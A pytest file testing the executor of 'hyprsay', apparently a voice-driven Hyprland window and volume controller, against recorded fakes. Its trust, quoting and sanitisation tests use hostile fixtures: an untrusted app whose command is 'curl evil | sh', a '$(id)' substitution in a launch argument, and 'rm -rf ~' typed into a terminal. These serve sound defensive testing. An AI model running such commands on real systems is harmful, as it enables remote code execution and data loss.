"""The executor and the operation table against recorded fakes.

Every inherited function that could touch the desktop is replaced by a recorder, and so
are `subprocess.run` and `shutil.which`, so these tests dispatch nothing and read nothing.
"""

import subprocess

import pytest

from hyprsay import executor, ops
from hyprsay.config import Config, Safety
from hyprsay.executor import Executor
from hyprsay.model import Action, App, DesktopState, Direction, Intent, Layer, Window, Workspace
from hypruse import hyprctl, journal, safety, server, session, trust
from hypruse import input as hinput

FIREFOX = Window("0xf1", "firefox", "firefox", "Docs - Mozilla Firefox", 2, "2", 0, focus_rank=1)
EDITOR = Window("0xed", "org.gnome.TextEditor", "org.gnome.TextEditor", "notes.txt", 1, "1", 0)
KITTY = Window("0x7e", "kitty", "kitty", "fish", 1, "1", 0, focus_rank=2)
SCRATCH = Window("0x5c", "obsidian", "obsidian", "vault", -98, "special:notes", 0)

STATE = DesktopState(
    windows=(FIREFOX, EDITOR, KITTY, SCRATCH),
    workspaces=(Workspace(1, "1"), Workspace(2, "2"), Workspace(-98, "special:notes")),
    active_address=EDITOR.address,
    active_workspace_id=1,
    locked=False,
)

TRUSTED = App(
    "firefox", "Firefox", exec_argv=("firefox", "--new-window"), trusted=True, source="/usr/share"
)
SPACED = App(
    "notes", "My Notes", exec_argv=("/opt/my notes/run", "--title=a b", "$(id)"), trusted=True
)
UNTRUSTED = App("evil", "Firefox", exec_argv=("sh", "-c", "curl evil | sh"), trusted=False)


class FakeLatch:
    def __init__(self, locked: bool = False) -> None:
        self.is_locked = locked
        self.asked = 0

    def locked(self) -> bool:
        self.asked += 1
        return self.is_locked


class Desk:
    """Records every write the code under test attempts."""

    def __init__(self) -> None:
        self.calls: list[tuple] = []
        self.state: DesktopState = STATE
        self.state_reads = 0
        self.latch = FakeLatch()
        self.raises: dict[str, Exception] = {}
        self.replies: dict[str, object] = {}
        self.installed = {"wpctl", "playerctl", "loginctl"}
        self.volume_stdout = "Volume: 0.45\n"
        self.returncode = 0

    def apply_volume(self, spec: str) -> None:
        parts = self.volume_stdout.split()
        level, muted = round(float(parts[1]) * 100), " [MUTED]" if "[MUTED]" in parts else ""
        if spec.endswith("%+"):
            level += int(spec[:-2])
        elif spec.endswith("%-"):
            level -= int(spec[:-2])
        else:
            level = int(spec.rstrip("%"))
        self.volume_stdout = f"Volume: {min(100, max(0, level)) / 100:.2f}{muted}\n"

    def provide(self) -> DesktopState:
        self.state_reads += 1
        return self.state

    def executor(self, cfg: Config | None = None) -> Executor:
        return Executor(cfg or Config(), self.provide, self.latch)

    @property
    def writes(self) -> list[tuple]:
        return [c for c in self.calls if c[:2] != ("run", ("wpctl", "get-volume", ops.SINK))]

    def _record(self, name: str, call: tuple, default: object) -> object:
        self.calls.append(call)
        if name in self.raises:
            raise self.raises[name]
        return self.replies.get(name, default)


@pytest.fixture
def desk(monkeypatch) -> Desk:
    d = Desk()

    def hypr(action, target="", workspace="", then="none"):
        return d._record("hypr", ("hypr", action, target, workspace), f"did {action}")

    def launch(command, workspace="", wait_s=8.0):
        reply = {"address": "0xnew", "class": "firefox", "title": "", "workspace": 1}
        return d._record("launch", ("launch", command, workspace, wait_s), reply)

    def keyboard(action, text="", keys="", window="", then="none", allow_auth=False):
        call = ("keyboard", action, text, keys, window, allow_auth)
        return d._record("keyboard", call, f"typed {len(text)} characters")

    def dispatch(name, *args):
        d._record("dispatch", ("dispatch", name, *args), None)

    def run(argv, **kwargs):
        assert isinstance(argv, list), "an argument vector, never a shell line"
        assert not kwargs.get("shell")
        d._record("run", ("run", tuple(argv)), None)
        if "set-volume" in argv:
            d.apply_volume(argv[-1])  # a sink that really has a level, capped like wpctl -l 1.0
        stdout = d.volume_stdout if "get-volume" in argv else ""
        return subprocess.CompletedProcess(argv, d.returncode, stdout=stdout, stderr="")

    monkeypatch.setattr(server, "hypr", hypr)
    monkeypatch.setattr(server, "launch", launch)
    monkeypatch.setattr(server, "keyboard", keyboard)
    monkeypatch.setattr(server, "READONLY", False)
    monkeypatch.setattr(hyprctl, "dispatch", dispatch)
    monkeypatch.setattr(trust, "guard_window", lambda address: None)
    monkeypatch.setattr(safety, "touch", lambda action: None)
    monkeypatch.setattr(ops.subprocess, "run", run)
    monkeypatch.setattr(
        ops.shutil, "which", lambda name: f"/usr/bin/{name}" if name in d.installed else None
    )
    monkeypatch.delenv("HYPRUSE_CONFINE", raising=False)
    monkeypatch.setenv("XDG_SESSION_ID", "3")
    return d


def wpctl(*args: str) -> tuple:
    return ("run", ("wpctl", *args))


# ------------------------------------------------------------- exact dispatch arguments


DISPATCHES = [
    (Action(Intent.FOCUS_WINDOW, window=FIREFOX), [("hypr", "focus_window", "0xf1", "")]),
    (Action(Intent.CLOSE_WINDOW, window=FIREFOX), [("hypr", "close_window", "0xf1", "")]),
    (
        Action(Intent.MOVE_TO_WORKSPACE, window=FIREFOX, workspace="4"),
        [("hypr", "move_window", "0xf1", "4")],
    ),
    (
        Action(Intent.MOVE_TO_WORKSPACE, window=FIREFOX, workspace="special:notes"),
        [("hypr", "move_window", "0xf1", "special:notes")],
    ),
    (Action(Intent.SWITCH_WORKSPACE, workspace="3"), [("hypr", "workspace", "", "3")]),
    (Action(Intent.SWITCH_WORKSPACE, workspace="next"), [("hypr", "workspace", "", "e+1")]),
    (Action(Intent.SWITCH_WORKSPACE, workspace="previous"), [("hypr", "workspace", "", "e-1")]),
    (Action(Intent.FULLSCREEN, window=FIREFOX), [("hypr", "fullscreen", "0xf1", "")]),
    (Action(Intent.TOGGLE_FLOATING, window=FIREFOX), [("hypr", "toggle_floating", "0xf1", "")]),
    (
        Action(Intent.LAUNCH_APP, app=TRUSTED),
        [("launch", "firefox --new-window", "", ops.LAUNCH_WAIT_S)],
    ),
    (
        Action(Intent.LAUNCH_APP, app=TRUSTED, workspace="5"),
        [("launch", "firefox --new-window", "5", ops.LAUNCH_WAIT_S)],
    ),
    (
        Action(Intent.RESIZE_WINDOW, window=FIREFOX, direction=Direction.RIGHT, amount=2),
        [("dispatch", "resizewindowpixel", "80 0,address:0xf1")],
    ),
    (
        Action(Intent.RESIZE_WINDOW, window=FIREFOX, direction=Direction.UP, amount=4),
        [("dispatch", "resizewindowpixel", "0 -320,address:0xf1")],
    ),
    (
        Action(Intent.RESIZE_WINDOW, window=FIREFOX, verb="shrink", amount=0),
        [("dispatch", "resizewindowpixel", "-20 -20,address:0xf1")],
    ),
    (  # "narrower": the grammar sends the axis as RIGHT and the sign in the verb
        Action(Intent.RESIZE_WINDOW, window=FIREFOX, verb="shrink", direction=Direction.RIGHT),
        [("dispatch", "resizewindowpixel", "-80 0,address:0xf1")],
    ),
    (  # "taller"
        Action(Intent.RESIZE_WINDOW, window=FIREFOX, verb="grow", direction=Direction.DOWN),
        [("dispatch", "resizewindowpixel", "0 80,address:0xf1")],
    ),
    (
        Action(Intent.RESIZE_WINDOW, window=FIREFOX, direction=Direction.LEFT, amount=1),
        [("dispatch", "resizewindowpixel", "-40 0,address:0xf1")],
    ),
    (
        Action(Intent.MOVE_WINDOW, window=EDITOR, direction=Direction.LEFT),
        [("dispatch", "movewindow", "l")],
    ),
    (Action(Intent.FOCUS_DIRECTION, direction=Direction.DOWN), [("dispatch", "movefocus", "d")]),
    (
        Action(Intent.VOLUME, verb="up"),
        [wpctl("set-volume", "-l", "1.0", "@DEFAULT_AUDIO_SINK@", "5%+")],
    ),
    (
        Action(Intent.VOLUME, verb="down", amount=3),
        [wpctl("set-volume", "-l", "1.0", "@DEFAULT_AUDIO_SINK@", "20%-")],
    ),
    (
        Action(Intent.VOLUME, verb="set", number=30),
        [wpctl("set-volume", "-l", "1.0", "@DEFAULT_AUDIO_SINK@", "30%")],
    ),
    (Action(Intent.VOLUME, verb="mute"), [wpctl("set-mute", "@DEFAULT_AUDIO_SINK@", "1")]),
    (Action(Intent.VOLUME, verb="unmute"), [wpctl("set-mute", "@DEFAULT_AUDIO_SINK@", "0")]),
    (Action(Intent.MEDIA, verb="play_pause"), [("run", ("playerctl", "play-pause"))]),
    (Action(Intent.MEDIA, verb="next"), [("run", ("playerctl", "next"))]),
    (Action(Intent.LOCK_SCREEN), [("run", ("loginctl", "lock-session", "3"))]),
]


@pytest.mark.parametrize(("action", "expected"), DISPATCHES, ids=lambda v: getattr(v, "intent", ""))
def test_each_intent_makes_exactly_this_call(desk, action, expected):
    outcome = desk.executor().execute(action)
    assert outcome.ok, outcome.message
    assert desk.writes == expected


def test_every_acting_intent_has_an_operation_and_no_meta_intent_does():
    meta = {Intent.UNDO, Intent.AGAIN, Intent.CANCEL, Intent.HELP, Intent.PICK, Intent.NONE}
    assert set(ops.OPERATIONS) == set(Intent) - meta


def test_moving_a_window_that_is_not_focused_focuses_it_through_the_guarded_hypr_first(desk):
    outcome = desk.executor().execute(
        Action(Intent.MOVE_WINDOW, window=FIREFOX, direction=Direction.RIGHT)
    )
    assert outcome.ok
    assert desk.calls == [("hypr", "focus_window", "0xf1", ""), ("dispatch", "movewindow", "r")]


def test_a_launch_command_is_the_quoted_argument_vector_so_the_shell_sees_no_syntax(desk):
    desk.executor().execute(Action(Intent.LAUNCH_APP, app=SPACED))
    command = desk.calls[0][1]
    assert command == "'/opt/my notes/run' '--title=a b' '$(id)'"


def test_a_deictic_action_without_a_window_targets_the_pinned_window(desk):
    desk.executor().execute(Action(Intent.FULLSCREEN), pinned_address=FIREFOX.address)
    assert desk.calls == [("hypr", "fullscreen", "0xf1", "")]


def test_without_a_pin_a_windowless_action_targets_the_fresh_focused_window_by_address(desk):
    desk.executor().execute(Action(Intent.TOGGLE_FLOATING))
    assert desk.calls == [("hypr", "toggle_floating", EDITOR.address, "")]


def test_with_nothing_focused_a_windowless_action_is_refused(desk):
    desk.state = DesktopState(locked=False)
    outcome = desk.executor().execute(Action(Intent.FULLSCREEN))
    assert not outcome.ok
    assert outcome.message == executor.NO_WINDOW
    assert desk.calls == []


def test_a_meta_intent_with_no_operation_does_nothing(desk):
    outcome = desk.executor().execute(Action(Intent.HELP))
    assert not outcome.ok
    assert desk.calls == []


# ---------------------------------------------------------------------------- the lock


@pytest.mark.parametrize(
    ("action", "_expected"), DISPATCHES, ids=lambda v: getattr(v, "intent", "")
)
def test_a_locked_desk_refuses_every_intent_with_zero_calls(desk, action, _expected):
    desk.latch.is_locked = True
    outcome = desk.executor().execute(action)
    assert outcome == executor.Outcome(False, executor.LOCKED)
    assert desk.calls == []
    assert desk.state_reads == 0


def test_a_latch_that_raises_counts_as_locked(desk):
    def explode() -> bool:
        raise RuntimeError("latch broke")

    desk.latch.locked = explode
    outcome = desk.executor().execute(Action(Intent.SWITCH_WORKSPACE, workspace="3"))
    assert outcome.message == executor.LOCKED
    assert desk.calls == []


def test_a_fresh_state_that_says_locked_refuses_even_when_the_latch_did_not(desk):
    desk.state = DesktopState(windows=STATE.windows, locked=True)
    outcome = desk.executor().execute(Action(Intent.FOCUS_WINDOW, window=FIREFOX))
    assert outcome.message == executor.LOCKED
    assert desk.calls == []


def test_the_latch_is_asked_before_every_write_including_undo_and_again(desk):
    ex = desk.executor()
    ex.execute(Action(Intent.SWITCH_WORKSPACE, workspace="3"))
    ex.again()
    ex.undo()
    assert desk.latch.asked == 3


def test_undo_is_refused_while_locked(desk):
    ex = desk.executor()
    ex.execute(Action(Intent.SWITCH_WORKSPACE, workspace="3"))
    desk.calls.clear()
    desk.latch.is_locked = True
    assert ex.undo().message == executor.LOCKED
    assert ex.again().message == executor.LOCKED
    assert desk.calls == []


def test_an_unreadable_desktop_refuses(desk):
    def unreadable() -> DesktopState:
        raise OSError("socket gone")

    ex = Executor(Config(), unreadable, desk.latch)
    outcome = ex.execute(Action(Intent.SWITCH_WORKSPACE, workspace="3"))
    assert outcome == executor.Outcome(False, executor.UNREADABLE)
    assert desk.calls == []


def test_read_only_mode_refuses_every_write(desk, monkeypatch):
    monkeypatch.setattr(server, "READONLY", True)
    outcome = desk.executor().execute(Action(Intent.SWITCH_WORKSPACE, workspace="3"))
    assert outcome.message == executor.READ_ONLY
    assert desk.calls == []


# --------------------------------------------------------------- the window must still match


def test_an_address_now_owned_by_another_class_is_refused_as_the_window_changed(desk):
    impostor = Window("0xf1", "org.keepassxc.KeePassXC", "keepassxc", "Passwords", 2, "2", 0)
    desk.state = DesktopState(windows=(impostor, EDITOR), active_address="0xed", locked=False)
    outcome = desk.executor().execute(Action(Intent.CLOSE_WINDOW, window=FIREFOX))
    assert not outcome.ok
    assert "the window changed" in outcome.message.lower()
    assert desk.calls == []


def test_a_window_that_is_gone_is_refused_as_the_window_changed(desk):
    desk.state = DesktopState(windows=(EDITOR,), active_address="0xed", locked=False)
    outcome = desk.executor().execute(Action(Intent.FOCUS_WINDOW, window=FIREFOX))
    assert outcome.message == executor.WINDOW_CHANGED
    assert desk.calls == []


def test_a_changed_title_is_not_a_changed_window(desk):
    retitled = Window("0xf1", "firefox", "firefox", "Another tab", 2, "2", 0)
    desk.state = DesktopState(windows=(retitled,), active_address="0xf1", locked=False)
    assert desk.executor().execute(Action(Intent.FOCUS_WINDOW, window=FIREFOX)).ok


# ------------------------------------------------------------------------------ launch


def test_an_untrusted_app_is_never_launched(desk):
    outcome = desk.executor().execute(Action(Intent.LAUNCH_APP, app=UNTRUSTED))
    assert not outcome.ok
    assert "not approved" in outcome.message
    assert desk.calls == []


def test_a_launch_with_no_app_or_no_command_is_refused(desk):
    ex = desk.executor()
    assert not ex.execute(Action(Intent.LAUNCH_APP)).ok
    assert not ex.execute(Action(Intent.LAUNCH_APP, app=App("x", "X", trusted=True))).ok
    assert desk.calls == []


def test_a_launch_whose_window_has_not_appeared_is_still_a_success(desk):
    desk.replies["launch"] = "launched, but no new window appeared within 2s"
    outcome = desk.executor().execute(Action(Intent.LAUNCH_APP, app=TRUSTED))
    assert outcome.ok
    assert "not appeared" in outcome.message


# ------------------------------------------------------------------------------ typing


def typing(text: str, window: Window = EDITOR) -> Action:
    return Action(Intent.TYPE_TEXT, window=window, text=text)


def test_typing_goes_to_the_pinned_address_in_type_mode_without_allow_auth(desk):
    outcome = desk.executor().execute(typing("hello world"), pinned_address=EDITOR.address)
    assert outcome.ok, outcome.message
    assert desk.calls == [("keyboard", "type", "hello world", "", EDITOR.address, False)]


def test_typing_is_refused_when_focus_moved_since_key_down(desk):
    desk.state = DesktopState(windows=STATE.windows, active_address=FIREFOX.address, locked=False)
    outcome = desk.executor().execute(typing("hello"), pinned_address=EDITOR.address)
    assert outcome == executor.Outcome(False, executor.FOCUS_MOVED)
    assert desk.calls == []


def test_typing_is_refused_when_the_pinned_address_now_holds_another_class(desk):
    impostor = Window(EDITOR.address, "gcr-prompter", "gcr-prompter", "Unlock", 1, "1", 0)
    desk.state = DesktopState(windows=(impostor,), active_address=EDITOR.address, locked=False)
    outcome = desk.executor().execute(typing("hello"), pinned_address=EDITOR.address)
    assert outcome.message == executor.WINDOW_CHANGED
    assert desk.calls == []


@pytest.mark.parametrize(
    ("action", "pinned"),
    [
        (typing("hello"), ""),
        (Action(Intent.TYPE_TEXT, text="hello"), EDITOR.address),
        (typing("hello", FIREFOX), EDITOR.address),
    ],
)
def test_typing_without_a_consistent_pin_is_refused(desk, action, pinned):
    outcome = desk.executor().execute(action, pinned_address=pinned)
    assert not outcome.ok
    assert desk.calls == []


@pytest.mark.parametrize("cls", ["kitty", "Alacritty", "org.wezfurlong.wezterm", "foot"])
def test_typing_into_a_terminal_is_refused(desk, cls):
    terminal = Window("0x7e", cls, cls, "fish", 1, "1", 0)
    desk.state = DesktopState(windows=(terminal,), active_address="0x7e", locked=False)
    outcome = desk.executor().execute(typing("rm -rf ~", terminal), pinned_address="0x7e")
    assert not outcome.ok
    assert "terminal" in outcome.message
    assert desk.calls == []


def test_control_characters_are_stripped_before_anything_is_typed(desk):
    hostile = "ls\n; rm\r -rf\x1b[2J \x00~\x7f\x9b\u2028now\u2029\tdone"
    desk.executor().execute(typing(hostile), pinned_address=EDITOR.address)
    typed = desk.calls[0][2]
    assert typed == "ls ; rm -rf[2J ~ now done"
    assert all(ch.isprintable() for ch in typed)


def test_typed_text_is_capped_at_the_configured_length(desk):
    cfg = Config(safety=Safety(type_max_chars=10))
    desk.executor(cfg).execute(typing("abcdefghij-overflow"), pinned_address=EDITOR.address)
    assert desk.calls[0][2] == "abcdefghij"


def test_text_that_is_only_control_characters_types_nothing(desk):
    outcome = desk.executor().execute(typing("\n\r\x1b"), pinned_address=EDITOR.address)
    assert not outcome.ok
    assert desk.calls == []


def test_typing_never_presses_a_key_so_it_can_never_send_enter(desk):
    desk.executor().execute(typing("hello\n"), pinned_address=EDITOR.address)
    assert [c[1] for c in desk.calls] == ["type"]
    assert all(c[3] == "" for c in desk.calls)


def test_a_typing_message_never_contains_the_dictated_text(desk):
    outcome = desk.executor().execute(typing("my secret phrase"), pinned_address=EDITOR.address)
    assert "secret" not in outcome.message


# ------------------------------------------------------------------------------- undo


def undo_calls(desk: Desk, action: Action, pinned: str = "") -> list[tuple]:
    ex = desk.executor()
    assert ex.execute(action, pinned_address=pinned).ok
    desk.calls.clear()
    outcome = ex.undo()
    assert outcome.ok, outcome.message
    assert outcome.message.startswith("Undone.")
    return desk.writes


def test_undoing_a_focus_refocuses_the_window_that_had_focus_before(desk):
    calls = undo_calls(desk, Action(Intent.FOCUS_WINDOW, window=FIREFOX))
    assert calls == [("hypr", "focus_window", EDITOR.address, "")]


def test_undoing_a_directional_focus_returns_to_the_exact_window_not_the_opposite_way(desk):
    calls = undo_calls(desk, Action(Intent.FOCUS_DIRECTION, direction=Direction.LEFT))
    assert calls == [("hypr", "focus_window", EDITOR.address, "")]


def test_undoing_a_workspace_switch_returns_to_the_previous_workspace_id(desk):
    calls = undo_calls(desk, Action(Intent.SWITCH_WORKSPACE, workspace="next"))
    assert calls == [("hypr", "workspace", "", "1")]


def test_undoing_a_move_sends_the_window_back_where_it_was(desk):
    calls = undo_calls(desk, Action(Intent.MOVE_TO_WORKSPACE, window=FIREFOX, workspace="7"))
    assert calls == [("hypr", "move_window", "0xf1", "2")]


def test_undoing_a_move_out_of_a_special_workspace_names_it(desk):
    calls = undo_calls(desk, Action(Intent.MOVE_TO_WORKSPACE, window=SCRATCH, workspace="1"))
    assert calls == [("hypr", "move_window", "0x5c", "special:notes")]


@pytest.mark.parametrize(
    ("intent", "verb"),
    [(Intent.FULLSCREEN, "fullscreen"), (Intent.TOGGLE_FLOATING, "toggle_floating")],
)
def test_undoing_a_toggle_is_the_same_toggle(desk, intent, verb):
    assert undo_calls(desk, Action(intent, window=FIREFOX)) == [("hypr", verb, "0xf1", "")]


def test_undoing_a_resize_applies_the_opposite_delta(desk):
    grow = Action(Intent.RESIZE_WINDOW, window=FIREFOX, direction=Direction.RIGHT, amount=3)
    assert undo_calls(desk, grow) == [("dispatch", "resizewindowpixel", "-160 0,address:0xf1")]


def test_undoing_narrower_makes_it_wider_again(desk):
    narrower = Action(
        Intent.RESIZE_WINDOW, window=FIREFOX, verb="shrink", direction=Direction.RIGHT
    )
    assert undo_calls(desk, narrower) == [("dispatch", "resizewindowpixel", "80 0,address:0xf1")]


def test_undoing_a_directionless_shrink_grows_by_the_same_amount(desk):
    shrink = Action(Intent.RESIZE_WINDOW, window=FIREFOX, verb="shrink", amount=1)
    assert undo_calls(desk, shrink) == [("dispatch", "resizewindowpixel", "40 40,address:0xf1")]


@pytest.mark.parametrize("verb", ["up", "down"])
def test_undoing_a_volume_step_restores_the_level_that_was_there(desk, verb):
    # not "step the other way": that is only the same thing away from the ends of the scale
    calls = undo_calls(desk, Action(Intent.VOLUME, verb=verb))
    assert calls == [wpctl("set-volume", "-l", "1.0", ops.SINK, "45%")]


def test_volume_up_at_the_maximum_says_so_and_leaves_nothing_to_undo(desk):
    # seen live: "up" at 100 percent changed nothing, reported "done", and an undo that
    # stepped down would then have lowered the volume by 5 percent
    desk.volume_stdout = "Volume: 1.00\n"
    executor = desk.executor()
    outcome = executor.execute(Action(Intent.VOLUME, verb="up"))
    assert outcome.ok and outcome.message.startswith(ops.NOTHING_CHANGED)
    assert "100 percent" in outcome.message
    assert outcome.inverse is None
    assert executor.undo().ok is False
    assert desk.volume_stdout == "Volume: 1.00\n"


def test_a_volume_change_reports_the_level_it_reached(desk):
    executor = desk.executor()
    assert executor.execute(Action(Intent.VOLUME, verb="up")).message == "Volume 50 percent."


def test_undoing_mute_unmutes(desk):
    assert undo_calls(desk, Action(Intent.VOLUME, verb="mute")) == [
        wpctl("set-mute", ops.SINK, "0")
    ]


def test_undoing_a_set_volume_restores_the_level_read_before_the_change(desk):
    desk.volume_stdout = "Volume: 0.45 [MUTED]\n"
    calls = undo_calls(desk, Action(Intent.VOLUME, verb="set", number=80))
    assert calls == [wpctl("set-volume", "-l", "1.0", ops.SINK, "45%")]


def test_undoing_a_layout_move_moves_the_other_way(desk):
    calls = undo_calls(desk, Action(Intent.MOVE_WINDOW, window=EDITOR, direction=Direction.UP))
    assert calls == [("dispatch", "movewindow", "d")]


@pytest.mark.parametrize(
    ("action", "pinned"),
    [
        (Action(Intent.CLOSE_WINDOW, window=FIREFOX), ""),
        (Action(Intent.LAUNCH_APP, app=TRUSTED), ""),
        (typing("hello"), EDITOR.address),
        (Action(Intent.LOCK_SCREEN), ""),
        (Action(Intent.SWITCH_WORKSPACE, workspace="special:notes"), ""),
    ],
)
def test_these_have_no_inverse_so_undo_does_nothing(desk, action, pinned):
    ex = desk.executor()
    outcome = ex.execute(action, pinned_address=pinned)
    assert outcome.ok
    assert outcome.inverse is None
    desk.calls.clear()
    assert ex.undo() == executor.Outcome(False, "There is nothing to undo.")
    assert desk.calls == []


def test_a_second_undo_does_not_flip_the_desktop_back(desk):
    ex = desk.executor()
    ex.execute(Action(Intent.FOCUS_WINDOW, window=FIREFOX))
    assert ex.undo().ok
    desk.calls.clear()
    assert not ex.undo().ok
    assert desk.calls == []


def test_a_failed_action_leaves_the_previous_undo_in_place(desk):
    ex = desk.executor()
    ex.execute(Action(Intent.SWITCH_WORKSPACE, workspace="3"))
    assert not ex.execute(Action(Intent.LAUNCH_APP, app=UNTRUSTED)).ok
    desk.calls.clear()
    assert ex.undo().ok
    assert desk.calls == [("hypr", "workspace", "", "1")]


def test_an_undo_whose_window_changed_class_is_refused(desk):
    ex = desk.executor()
    ex.execute(Action(Intent.FOCUS_WINDOW, window=FIREFOX))
    impostor = Window(EDITOR.address, "hyprpolkitagent", "hyprpolkitagent", "Auth", 1, "1", 0)
    desk.state = DesktopState(windows=(FIREFOX, impostor), active_address="0xf1", locked=False)
    desk.calls.clear()
    assert ex.undo().message == executor.WINDOW_CHANGED
    assert desk.calls == []


def test_the_undo_intent_routes_to_undo(desk):
    ex = desk.executor()
    ex.execute(Action(Intent.SWITCH_WORKSPACE, workspace="3"))
    desk.calls.clear()
    assert ex.execute(Action(Intent.UNDO)).ok
    assert desk.calls == [("hypr", "workspace", "", "1")]


# ------------------------------------------------------------------------------ again


def test_again_repeats_the_last_action_with_the_same_arguments(desk):
    ex = desk.executor()
    grow = Action(Intent.RESIZE_WINDOW, window=FIREFOX, direction=Direction.DOWN, amount=1)
    ex.execute(grow)
    assert ex.execute(Action(Intent.AGAIN)).ok
    assert desk.calls == [("dispatch", "resizewindowpixel", "0 40,address:0xf1")] * 2


def test_again_with_no_history_does_nothing(desk):
    assert desk.executor().again() == executor.Outcome(False, "There is nothing to repeat.")


@pytest.mark.parametrize(
    ("action", "pinned"),
    [
        (Action(Intent.CLOSE_WINDOW, window=FIREFOX), ""),
        (typing("hello"), EDITOR.address),
        (Action(Intent.LOCK_SCREEN), ""),
    ],
)
def test_again_never_repeats_an_operation_that_needed_a_countdown_or_a_key(desk, action, pinned):
    ex = desk.executor()
    assert ex.execute(action, pinned_address=pinned).ok
    desk.calls.clear()
    assert not ex.again().ok
    assert desk.calls == []


def test_forget_drops_both_memories(desk):
    ex = desk.executor()
    ex.execute(Action(Intent.SWITCH_WORKSPACE, workspace="3"))
    ex.forget()
    assert not ex.undo().ok
    assert not ex.again().ok


# ------------------------------------------------------------------ failures become sentences


@pytest.mark.parametrize(
    ("raised", "starts"),
    [
        (trust.TrustError("firefox is outside the scope. Call desktop() first."), "Refused: "),
        (ValueError("'x' is not a window address, use the `address` field"), "That could not"),
        (TypeError("bad argument"), "That could not"),
        (hyprctl.HyprctlError("dispatch focuswindow: Window not found"), "Hyprland did not"),
        (journal.DryRunError("dispatch refused"), "Dry run"),
        (RuntimeError("anything else"), "That failed (RuntimeError)"),
    ],
)
def test_every_inherited_exception_becomes_a_failed_outcome_with_a_sentence(desk, raised, starts):
    desk.raises["hypr"] = raised
    outcome = desk.executor().execute(Action(Intent.FOCUS_WINDOW, window=FIREFOX))
    assert not outcome.ok
    assert outcome.inverse is None
    assert outcome.message.startswith(starts)
    assert "\n" not in outcome.message


def test_a_refusal_keeps_only_the_first_sentence_and_drops_the_agent_advice(desk):
    desk.raises["keyboard"] = trust.TrustError(
        "the launcher layer 'wofi' holds the keyboard grab, so keys cannot reach the "
        "requested window. Dismiss it first with keyboard(action='key', keys='esc')."
    )
    outcome = desk.executor().execute(typing("hello"), pinned_address=EDITOR.address)
    assert outcome.message == (
        "Refused: the launcher layer 'wofi' holds the keyboard grab, so keys cannot reach "
        "the requested window."
    )


def test_an_input_failure_while_typing_is_a_sentence(desk):
    desk.raises["keyboard"] = hinput.InputError("wtype exited 1")
    outcome = desk.executor().execute(typing("hello"), pinned_address=EDITOR.address)
    assert outcome.message.startswith("The text could not be delivered")


def test_control_characters_in_an_error_never_reach_the_hud(desk):
    desk.raises["hypr"] = trust.TrustError("class 'evil\x1b[31m\nname' is outside the scope")
    outcome = desk.executor().execute(Action(Intent.FOCUS_WINDOW, window=FIREFOX))
    assert "\x1b" not in outcome.message
    assert "\n" not in outcome.message


def test_a_window_that_stays_open_after_close_is_not_a_success(desk):
    desk.replies["hypr"] = "asked 0xf1 to close, but it is still open after 1s"
    outcome = desk.executor().execute(Action(Intent.CLOSE_WINDOW, window=FIREFOX))
    assert not outcome.ok
    assert "still open" in outcome.message


def test_a_confirmed_close_says_closed(desk):
    desk.replies["hypr"] = "closed 0xf1"
    outcome = desk.executor().execute(Action(Intent.CLOSE_WINDOW, window=FIREFOX))
    assert outcome == executor.Outcome(True, "Closed firefox.")


def test_a_dry_run_reply_passes_through_and_offers_nothing_to_undo(desk):
    desk.replies["hypr"] = "DRY RUN, nothing was delivered: would focus 0xf1"
    outcome = desk.executor().execute(Action(Intent.FOCUS_WINDOW, window=FIREFOX))
    assert outcome.ok
    assert outcome.message.startswith("DRY RUN")
    assert outcome.inverse is None


def test_a_dry_run_never_spawns_the_volume_media_or_lock_tools(desk, monkeypatch):
    monkeypatch.setenv("HYPRUSE_DRYRUN", "1")
    ex = desk.executor()
    for action in (
        Action(Intent.VOLUME, verb="up"),
        Action(Intent.MEDIA, verb="next"),
        Action(Intent.LOCK_SCREEN),
        Action(Intent.FOCUS_DIRECTION, direction=Direction.LEFT),
        Action(Intent.RESIZE_WINDOW, window=FIREFOX, direction=Direction.LEFT),
    ):
        assert ex.execute(action).message.startswith("DRY RUN")
    assert desk.writes == []


@pytest.mark.parametrize(
    ("action", "tool"),
    [(Action(Intent.VOLUME, verb="up"), "wpctl"), (Action(Intent.MEDIA, verb="next"), "playerctl")],
)
def test_a_missing_tool_is_a_sentence_not_a_crash(desk, action, tool):
    desk.installed.discard(tool)
    outcome = desk.executor().execute(action)
    assert not outcome.ok
    assert outcome.message.startswith(f"{tool} is not installed")
    assert desk.writes == []


def test_a_tool_that_exits_nonzero_is_a_failure(desk):
    desk.returncode = 1
    outcome = desk.executor().execute(Action(Intent.MEDIA, verb="play_pause"))
    assert outcome == executor.Outcome(False, "playerctl refused the request.")


@pytest.mark.parametrize(
    "action",
    [
        Action(Intent.VOLUME, verb="explode"),
        Action(Intent.VOLUME, verb="set"),
        Action(Intent.MEDIA, verb="rewind"),
        Action(Intent.SWITCH_WORKSPACE),
        Action(Intent.MOVE_TO_WORKSPACE, window=FIREFOX),
        Action(Intent.MOVE_WINDOW, window=FIREFOX),
        Action(Intent.FOCUS_DIRECTION),
    ],
)
def test_an_action_missing_its_slot_is_refused_without_a_call(desk, action):
    assert not desk.executor().execute(action).ok
    assert desk.writes == []


def test_a_window_whose_address_is_not_hex_is_never_dispatched(desk):
    odd = Window("address:0xf1,exec", "firefox", "firefox", "", 1, "1", 0)
    desk.state = DesktopState(windows=(odd,), active_address=odd.address, locked=False)
    outcome = desk.executor().execute(
        Action(Intent.RESIZE_WINDOW, window=odd, direction=Direction.LEFT)
    )
    assert not outcome.ok
    assert desk.calls == []


def test_directional_focus_is_refused_under_confinement(desk, monkeypatch):
    monkeypatch.setenv("HYPRUSE_CONFINE", "class:firefox")
    outcome = desk.executor().execute(Action(Intent.FOCUS_DIRECTION, direction=Direction.LEFT))
    assert outcome.message.startswith("Refused: ")
    assert desk.calls == []


# ------------------------------------------------------------------------- pure helpers


def test_every_resize_amount_maps_to_its_pixel_step_and_out_of_range_is_clamped():
    def dx(amount):
        return ops.resize_delta(
            Action(Intent.RESIZE_WINDOW, direction=Direction.RIGHT, amount=amount)
        )

    assert [dx(a)[0] for a in range(5)] == [20, 40, 80, 160, 320]
    assert dx(None) == (80, 0)
    assert dx(99) == (320, 0)
    assert dx(-3) == (20, 0)


def test_a_volume_step_prefers_a_spoken_number_and_stays_within_bounds():
    assert ops.volume_step(Action(Intent.VOLUME, verb="up", number=12)) == 12
    assert ops.volume_step(Action(Intent.VOLUME, verb="up", number=900)) == 100
    assert ops.volume_argv(Action(Intent.VOLUME, verb="set", number=250))[-1] == "100%"


# -------------------------------------------------------------------------------- boot


def test_boot_runs_the_inherited_sequence_in_order_once_and_keeps_strict_off(monkeypatch):
    order: list[object] = []
